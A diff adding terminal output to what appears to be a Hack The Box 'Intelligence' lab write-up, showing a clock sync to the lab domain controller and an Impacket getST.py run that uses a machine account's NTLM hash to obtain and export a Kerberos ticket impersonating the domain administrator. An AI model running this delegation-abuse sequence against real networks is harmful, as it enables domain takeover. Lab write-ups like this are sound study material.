@@ -660,3 +660,24 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 [*] Getting TGT for user
 Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
 ```
+
+```
+──(root💀kali)-[~/Downloads/hackthebox/inteligence/BloodHound.py]
+└─# sudo ntpdate 10.10.10.248
+27 Oct 08:16:50 ntpdate[55600]: step time server 10.10.10.248 offset +25294.408715 sec
+```
+
+```
+┌──(root💀kali)-[~/Downloads/hackthebox/inteligence/BloodHound.py]
+└─# python3 /usr/share/doc/python3-impacket/examples/getST.py -hashes :c699eaac79b69357d9dabee3379547e6 -spn WWW/dc.intelligence.htb -impersonate administrator intelligence.htb/svc_int$
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Getting TGT for user
+[*] Impersonating administrator
+[*] 	Requesting S4U2self
+[*] 	Requesting S4U2Proxy
+[*] Saving ticket in administrator.ccache
+                                                                                                                      
+┌──(root💀kali)-[~/Downloads/hackthebox/inteligence/BloodHound.py]
+└─# export KRB5CCNAME=`pwd`/administrator.ccache
+```
